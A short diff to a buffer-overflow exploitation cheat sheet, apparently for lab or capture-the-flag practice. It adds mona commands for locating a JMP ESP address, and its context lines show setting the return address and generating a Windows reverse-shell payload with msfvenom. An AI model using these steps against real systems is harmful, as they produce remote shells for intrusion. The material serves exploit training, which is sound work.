@@ -126,6 +126,11 @@ except:
 
 - !mona jmp -r esp -cpb "BAD_CHARS" -> Choose an address and update exploit.py, setting the "retn" variable to the address, written backwards
 
+or
+
+- !mona modules
+- !mona find -s "\xff\xe4" -m DLL
+
 ### Generate Payload :
 
 - msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "BAD_CHARS" -f py -> Copy the generated shell code setting the payload variable
